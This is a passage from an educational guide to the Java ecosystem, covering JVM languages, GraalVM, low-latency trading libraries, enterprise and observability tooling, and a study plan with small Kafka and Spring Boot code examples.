        props.put(ProducerConfig.COMPRESSION_TYPE_CONFIG, "zstd");

        try (KafkaProducer<String, String> producer = new KafkaProducer<>(props)) {
            for (int i = 0; i < 10; i++) {
                String key = "order-" + i;
                String value = """
                        {"orderId": %d, "amount": %.2f, "ts": %d}
                        """.formatted(i, i * 12.5, System.currentTimeMillis());

                ProducerRecord<String, String> record =
                        new ProducerRecord<>("orders", key, value);

                RecordMetadata md = producer.send(record).get();
                System.out.printf("sent %s to %s-%d @ offset %d%n",
                        key, md.topic(), md.partition(), md.offset());
            }
            producer.flush();
        }
    }
}
```

The snippet shows the common pattern: idempotent producer, all-acks,
compressed, keyed records that partition deterministically.

---

## 12. Other JVM Languages

Java is the flagship language of the JVM but it is far from the only
one. The JVM is an unusually friendly target for language implementers
because of its mature GC, JIT, threading, and library ecosystem.

### Scala (2004)

**Scala**, by **Martin Odersky** at EPFL, is the most ambitious JVM
language after Java itself. It unifies object-oriented and functional
programming with an exceptionally rich type system (higher-kinded types,
path-dependent types, implicits, macros). Scala powers **Apache Spark**,
**Apache Kafka** (partially), **Akka** (the actor framework), and
infrastructure at Twitter, LinkedIn, and Databricks. **Scala 3** (2021)
was a major overhaul — new syntax (optional braces, indentation-based),
given/using for cleaner implicits, opaque types, and enums.

### Kotlin (2011, 1.0 in 2016)

**Kotlin**, by JetBrains, was explicitly designed to be "a better Java
that is still pragmatic Java". Null safety in the type system, extension
functions, data classes, coroutines, smooth Java interop. Kotlin became
the official Android language in 2017 and is widely used server-side
via Spring Boot (with full Kotlin DSL support), Ktor (JetBrains'
own Kotlin-native web framework), Quarkus, and Micronaut.

### Clojure (2007)

**Clojure**, by **Rich Hickey**, is a Lisp dialect on the JVM with
immutable persistent data structures and a software-transactional-memory
concurrency model. Clojure's philosophy — "simple made easy" — has
been enormously influential beyond its own user community. Popular in
data engineering shops, fintech, and among developers who want a
functional language without OCaml's platform limitations.

### Groovy (2003)

**Groovy**, originally by **James Strachan**, is a dynamically-typed
scripting language for the JVM. Groovy was **Gradle's original DSL**
(Kotlin DSL came later) and is the language of the **Grails** web
framework (Rails-inspired) and **Spock** (the BDD testing framework).
Groovy has declined from its 2010s peak but remains important wherever
Gradle and Jenkins Pipelines live.

### JRuby, Jython, Ceylon

- **JRuby** (Charles Nutter, Thomas Enebo, et al.) — Ruby on the JVM.
  Popular for Rails apps wanting JVM operational characteristics.
- **Jython** — Python on the JVM. Stuck at Python 2.7 and now largely
  dormant; **GraalVM Python** is where active polyglot Python-on-JVM
  work has moved.
- **Ceylon** (Red Hat, 2011; archived 2018) — Gavin King's attempt at a
  "better Java" with a union/intersection type system. Outcompeted by
  Kotlin.

---

## 13. The JVM as a Polyglot Runtime

The JVM was designed for one language — Java — but accidentally became
one of the best polyglot runtimes in existence.

### invokedynamic

Java 7 (2011) introduced the `invokedynamic` bytecode and the
**MethodHandle** API. These were motivated by dynamic languages like
JRuby and Groovy that needed a fast way to dispatch method calls whose
targets can change at runtime. Before `invokedynamic`, dynamic languages
had to emit slow reflective calls or generate classes on the fly.
`invokedynamic` gave them a first-class path into the JIT optimizer. It
is also what made Java's own lambda expressions efficient in Java 8.

### GraalVM and Truffle

**GraalVM** (Oracle Labs) is a polyglot runtime that runs Java, Scala,
Kotlin, JavaScript, Python, Ruby, R, LLVM bitcode, and WebAssembly —
all on the same VM, often in the same process, with zero-cost interop.

- **Graal** is a new JIT compiler written in Java that can replace
  HotSpot's C2.
- **Native Image** is an ahead-of-time compiler that produces static
  native binaries with no JVM, no class loading, and millisecond
  startup — the enabling technology for Quarkus native images.
- **Truffle** is a framework for writing language interpreters as ASTs
  of self-specializing nodes; combined with Graal it partially evaluates
  and JIT-compiles those interpreters into native code comparable to
  V8 for JavaScript or CPython for Python.

GraalVM's polyglot story is unique: an application can embed a
JavaScript engine, run R for stats, and call Java libraries, all from
the same process with shared memory.

---

## 14. Financial and Trading Systems

High-frequency trading outside of FPGA hot paths is largely a Java (and
C++) story. Java's deterministic behavior at the microsecond scale takes
work, but the tooling exists.

### LMAX Disruptor

The **LMAX Disruptor** was published by LMAX Exchange (Martin Thompson,
Dave Farley, and colleagues) in 2011. It is a lock-free ring buffer
that lets multiple producers and consumers exchange events with
single-digit microsecond latency. The Disruptor paper — and Martin
Thompson's "mechanical sympathy" blog — educated a generation of Java
developers about cache lines, false sharing, and memory barriers.

### Chronicle Suite

**Chronicle Software** (Peter Lawrey) sells the **Chronicle Queue**
persistent low-latency messaging library, **Chronicle Map** (off-heap
key-value), and **Chronicle Wire** serialization. These are used
heavily in trading and telemetry systems.

### Aeron

**Aeron**, also from Real Logic (Martin Thompson and Todd Montgomery),
is a high-performance UDP/IPC messaging transport with reliability and
flow control. It is the transport underneath many modern trading systems
and the reference implementation of Cluster (Raft) consensus in the
real-logic ecosystem.

### Azul Zing and Pauseless GC

**Azul Zing** (now Azul Platform Prime) is a commercial JVM with
**C4**, a pauseless concurrent compacting GC that keeps maximum pause
times under 1 ms even on multi-terabyte heaps. Zing is used in trading,
ad-tech, and anywhere a stop-the-world pause is unacceptable. OpenJDK's
**ZGC** and **Shenandoah** brought similar technology into the free
JVMs — ZGC now targets sub-millisecond pauses, with generational support
added in JDK 21.

### Off-heap and Lock-Free

HFT Java avoids heap allocation in hot paths. Techniques include:

- Off-heap memory via `sun.misc.Unsafe` (historical) or the newer
  **Foreign Function & Memory API** (Project Panama, stable in JDK 22).
- Primitive collections from libraries like Eclipse Collections,
  Koloboke, or Agrona.
- Object pools and arenas to eliminate per-event allocation.
- Lock-free algorithms built on `java.util.concurrent.atomic` and
  `VarHandle`.

Java is not OCaml (Jane Street's language of choice) and not C++, but
for most of the HFT world outside the FPGA race-to-the-bottom, it is
the pragmatic winner.

---

## 15. Enterprise Architecture Patterns

### Servlets, JSP, MVC

The servlet API (1997) is the low-level HTTP contract; everything
web-facing on the JVM, from Tomcat to Spring MVC to Jakarta REST, is
either a servlet container or a servlet implementation. **JSP**
(JavaServer Pages) and later **JSF** (JavaServer Faces) provided
server-side rendering; both are fading in favor of SPA frontends talking
to JSON APIs.

### EJB (and why nobody uses it anymore)

**Enterprise JavaBeans** was J2EE's flagship component model. EJB 2.x
had home interfaces, remote interfaces, deployment descriptors,
container-managed persistence, and enormous ceremony. EJB 3.x (Java EE
5, 2006) dramatically simplified things — a bean is now an annotated
POJO — but by then Spring had won the hearts and minds of developers,
and new projects rarely reach for EJB.

### Microservices

Modern Java enterprise architecture is dominated by **Spring Boot +
Spring Cloud** (or the equivalent in Quarkus/Micronaut/Helidon) deployed
to Kubernetes. The pattern stack:

- **Service discovery**: Eureka, Consul, or Kubernetes Services.
- **Config**: Spring Cloud Config, Consul KV, ConfigMaps.
- **Circuit breakers**: Resilience4j (Hystrix retired).
- **API gateway**: Spring Cloud Gateway, Kong, Envoy.
- **Service mesh**: Istio or Linkerd handle mTLS, traffic shaping,
  observability without per-service code.
- **gRPC**: `grpc-java` is the reference implementation; used heavily
  inside Google and increasingly in Java-first service meshes.
- **REST**: Spring MVC / Spring WebFlux, JAX-RS (Jersey, RESTEasy).
- **GraphQL**: `graphql-java` is the core, with **Netflix DGS** and
  **Spring for GraphQL** as higher-level frameworks.
- **Messaging**: Kafka is dominant for event streaming; RabbitMQ and
  ActiveMQ still common for classical queueing; JMS remains the
  Jakarta-EE-blessed messaging API.

---

## 16. Observability and APM

Java is the language where application performance management (APM)
matured, and every major commercial APM vendor has a Java agent at the
heart of their product.

### Commercial APMs

- **New Relic** — one of the first to popularize Java APM via
  instrumentation bytecode weaving.
- **Datadog APM** — Java agent, traces, profiling, error tracking.
- **Dynatrace** — deep auto-instrumentation, popular in large
  enterprises.
- **AppDynamics** (Cisco) — another enterprise stalwart.

All of them deliver their Java support as a `-javaagent:foo.jar` passed
to the JVM, which uses the **Java Instrumentation API** to rewrite
classes as they load and inject timing/error-capture hooks into method
bodies. This pattern — bytecode weaving at load time — is a
Java-specific superpower no other mainstream runtime matches.

### OpenTelemetry

**OpenTelemetry** (the merger of OpenCensus and OpenTracing) has a
first-class Java implementation and an **auto-instrumentation agent**
that provides the same `-javaagent` story as the commercial APMs but
vendor-neutral. The OTel Java SDK, API, and agent are now the default
choice for new Java observability work.

### Micrometer

**Micrometer** is a metrics facade (conceptually "SLF4J for metrics").
An application calls `meterRegistry.counter("http.requests")`; Micrometer
translates to the backend's native API (Prometheus, Datadog,
CloudWatch, StatsD, New Relic, Elastic, Wavefront, ...). Spring Boot
has used Micrometer as its metrics default since Spring Boot 2.0 and
extended it with **Micrometer Tracing** for distributed tracing.

### JFR — Java Flight Recorder

**JFR**, originally a feature of BEA's JRockit VM, was open-sourced in
OpenJDK 11 (2018). JFR is a very-low-overhead (<1%) always-on profiling
and event recording system built into the JVM. It captures GC events,
allocation samples, lock contention, JIT compilation, and user-defined
events into a compact binary `.jfr` file. Tools like **JDK Mission
Control**, **async-profiler**, and cloud-profiling services ingest JFR
recordings. It has become the native profiling format of the JVM.

---

## Closing Notes

The Java ecosystem is less a language and more a civilization. Its build
tools, package repository, testing frameworks, logging libraries, web
frameworks, ORMs, big data infrastructure, polyglot runtime, and
observability stack all compose into a production-grade platform that
runs trillions of dollars of daily commerce. Its scars (Log4Shell, the
Google v. Oracle saga, the `javax.*` → `jakarta.*` rename) are the scars
of something that has been used seriously, at scale, by everyone, for
decades.

The through-lines that distinguish Java as an ecosystem:

- **Backward compatibility as a core value.** A JAR compiled in 2004
  still runs on JDK 21.
- **A universal artifact format and repository.** Maven Central is the
  closest thing software has to a public library.
- **Specifications separated from implementations.** JPA has multiple
  implementations; JAX-RS has multiple implementations; the servlet API
  has many.
- **Tooling that treats bytecode as a first-class manipulable medium.**
  APMs, AOP frameworks, mocking libraries, Spring's proxies, Quarkus's
  build-time resolution, and GraalVM's native image all rest on bytecode
  being readable, transformable, and verifiable.
- **A polyglot runtime, almost by accident.** Scala, Kotlin, Clojure,
  Groovy — and via GraalVM, JavaScript, Python, Ruby, R, and
  WebAssembly — all share the JVM's GC, JIT, threading, and libraries.

Java is thirty years old. It is also the platform on which a lot of the
next thirty years will continue to be built.

---

## Study Guide — Java Ecosystem & Frameworks

### Tool map

- **JDK:** OpenJDK (reference) + Temurin, Corretto, Zulu (distributions).
- **Build:** Maven, Gradle (Groovy/Kotlin DSL).
- **Web frameworks:** Spring Boot, Quarkus, Micronaut, Helidon.
- **Testing:** JUnit 5, AssertJ, Mockito, Testcontainers.
- **Observability:** Micrometer, OpenTelemetry.
- **Languages on JVM:** Kotlin, Scala, Clojure, Groovy.

### 1-week plan

- Day 1: Install Temurin JDK 25 via `sdkman`. Compile
  HelloWorld.
- Day 2: `spring init` a web project. Run it.
- Day 3: Add a REST endpoint and a JPA entity.
- Day 4: Write JUnit 5 tests with AssertJ.
- Day 5: Dockerize with `spring-boot:build-image`.
- Day 6: Try Quarkus and compare startup time.
- Day 7: Explore Kotlin on the JVM.

---

## Programming Examples

### Example 1 — Spring Boot minimal REST

```java
@SpringBootApplication
@RestController
public class App {
    @GetMapping("/hello")
    public Map<String,String> hello() {
        return Map.of("greeting","hello");
    }
    public static void main(String[] args) {
        SpringApplication.run(App.class, args);
    }
}
```

Build with `./mvnw spring-boot:run`. Real web server, 12
lines.

---

## DIY & TRY

### DIY 1 — Native image a Spring Boot app

Install GraalVM. Build with `-Pnative`. Observe millisecond
startup time, no JVM warmup.

### DIY 2 — Testcontainers for integration tests

Add `testcontainers-postgresql`. Write a test that spins up
a real Postgres in Docker. This is how modern JVM teams
test DB code.

### TRY — Compare Spring Boot vs Quarkus

Build the same tiny service in both. Measure startup time,
memory footprint, and developer experience.

---

## Related College Departments

- [**coding**](../../../.college/departments/coding/DEPARTMENT.md)
- [**engineering**](../../../.college/departments/engineering/DEPARTMENT.md)
